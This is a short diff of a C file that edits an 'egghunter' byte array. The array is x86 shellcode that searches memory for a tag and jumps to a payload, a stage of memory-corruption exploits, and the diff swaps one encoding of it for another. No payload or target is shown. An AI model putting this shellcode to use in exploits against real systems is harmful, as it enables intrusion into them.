@@ -1,8 +1,7 @@
 #include <stdio.h>
 #include <string.h>
 
-
-char egghunter[] = "\x99\xba\x42\x4a\x42\x4a\x40\x39\x10\x75"
+char egghunter[] = "\xbb\x42\x4a\x42\x4a\x40\x39\x18\x75"
                    "\xfb\xff\xe0";
 
 
